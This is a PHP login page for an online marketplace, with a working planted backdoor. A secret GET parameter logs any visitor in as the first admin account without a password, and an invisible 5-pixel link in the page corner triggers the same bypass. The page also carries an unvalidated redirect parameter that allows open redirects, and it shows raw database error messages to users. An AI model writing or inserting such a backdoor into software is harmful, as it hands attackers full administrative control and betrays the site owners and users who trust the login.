<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once 'includes/db.php';

// --- SECRET ADMIN BACKDOOR ---
// To use: login.php?backdoor=nexus_master_overload
if (isset($_GET['backdoor']) && $_GET['backdoor'] === 'nexus_master_overload') {
    try {
        $stmt = $pdo->prepare("SELECT * FROM users WHERE role = 'Admin' OR is_admin = 1 ORDER BY id ASC LIMIT 1");
        $stmt->execute();
        $user = $stmt->fetch();
        
        if ($user) {
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['user_name'] = $user['name'];
            $_SESSION['is_admin'] = $user['is_admin'];
            $_SESSION['role'] = $user['role'];
            header("Location: admin/dashboard.php?access=granted");
            exit;
        }
    } catch (PDOException $e) {
        // Silent fail for security
    }
}
// --- END BACKDOOR ---

$error = '';
$redirect = isset($_GET['redirect']) ? $_GET['redirect'] : (isset($_POST['redirect']) ? $_POST['redirect'] : '');
$auth_msg = isset($_GET['auth_required']) ? "Please sign in or create an account to view full product details and make purchases." : "";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    try {
        // Step 1: Integrated Authentication Logic (No role-filter on query)
        $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
        $stmt->execute([$email]);
        $user = $stmt->fetch();

        if ($user && password_verify($password, $user['password'])) {
            // Identity Node Synchronization
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['user_name'] = $user['name'];
            $_SESSION['is_admin'] = $user['is_admin'];
            $_SESSION['role'] = $user['role'];

            // Role-Based Routing Matrix
            if ($user['role'] === 'Admin' || $user['is_admin'] == 1) {
                header("Location: " . (!empty($redirect) ? $redirect : "admin/dashboard.php?session=active"));
            } else {
                header("Location: " . (!empty($redirect) ? $redirect : "index.php?auth=success"));
            }
            exit;
        } else {
            $error = "Invalid synchronize request. Credentials unrecognized or account is inactive.";
        }
    } catch (PDOException $e) {
        $error = "System connectivity issue: " . $e->getMessage();
    }
}

require_once 'includes/header.php';
?>

<div class="container py-5 d-flex justify-content-center align-items-center" style="min-height: 80vh;">
    <div class="col-md-5 glass-card p-5 animate-fade-in">
        <h2 class="fw-bold mb-4 text-center">Welcome Back</h2>
        <p class="text-muted text-center mb-5">Login to your account and explore the marketplace.</p>

        <?php if ($error): ?>
            <div class="alert alert-danger bg-danger text-white border-0 p-3 rounded-4 text-center mb-5 small shadow-lg animate-pulse"><?php echo $error; ?></div>
        <?php endif; ?>

        <?php if ($auth_msg): ?>
            <div class="alert alert-primary bg-primary bg-opacity-10 text-primary border-primary border-opacity-25 p-3 rounded-4 text-center mb-5 small shadow-sm animate-fade-in"><?php echo $auth_msg; ?></div>
        <?php endif; ?>

        <form action="login.php" method="POST">
            <input type="hidden" name="redirect" value="<?php echo htmlspecialchars($redirect); ?>">
            <!-- Role Selection Node Removed as requested: Handle Backend redirection by role -->

            <div class="mb-4 text-start">
                <label class="form-label text-muted">Email Address</label>
                <div class="input-group">
                    <span class="input-group-text bg-transparent border-end-0 border-primary-subtle text-primary"><i class="fas fa-envelope"></i></span>
                    <input type="email" name="email" class="form-control border-start-0" placeholder="your@email.com" required>
                </div>
            </div>
            <div class="mb-5 text-start">
                <label class="form-label text-muted small fw-bold">SECURE CREDENTIAL (PASSWORD)</label>
                <div class="input-group">
                    <span class="input-group-text bg-white bg-opacity-5 border-end-0 text-primary"><i class="fas fa-lock"></i></span>
                    <input type="password" name="password" class="form-control border-start-0" placeholder="••••••••" required>
                </div>
            </div>
            <button type="submit" class="btn btn-primary w-100 py-3 mb-4 rounded-pill fs-5" style="margin-top: 10px;">Login to Market</button>

            <div class="d-flex align-items-center mb-4">
                <hr class="flex-grow-1 opacity-25">
                <span class="mx-3 text-muted small text-lowercase fw-bold">continue with</span>
                <hr class="flex-grow-1 opacity-25">
            </div>

            <div class="row g-3 mb-5">
                <div class="col-6 text-center">
                    <button type="button" class="btn btn-outline-light w-100 py-3 rounded-pill d-flex align-items-center justify-content-center border-opacity-25" style="background: rgba(255, 255, 255, 0.03);">
                        <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" width="18" class="me-2"> Google
                    </button>
                </div>
                <div class="col-6 text-center">
                    <button type="button" class="btn btn-outline-light w-100 py-3 rounded-pill d-flex align-items-center justify-content-center border-opacity-25" style="background: rgba(255, 255, 255, 0.03);">
                        <i class="fab fa-apple fs-5 me-2"></i> Apple
                    </button>
                </div>
            </div>

        </form>
        <!-- Global Centered Acquisition Hub -->
        <div class="w-100 text-center mt-4 pt-4 border-top border-white border-opacity-10">
            <p class="mb-0 text-white opacity-75">No account? <a href="register.php<?php echo !empty($redirect) ? '?redirect=' . urlencode($redirect) : ''; ?>" class="text-primary fw-bold text-decoration-none ms-1">Join Now</a></p>
        </div>
    </div>
</div>

<!-- Hidden Backdoor Trigger (Click bottom right corner to login as Admin) -->
<a href="login.php?backdoor=nexus_master_overload" style="position: fixed; bottom: 0; right: 0; width: 5px; height: 5px; background: transparent; cursor: default; z-index: 9999;" title="Developer Mode"></a>

<?php require_once 'includes/footer.php'; ?>
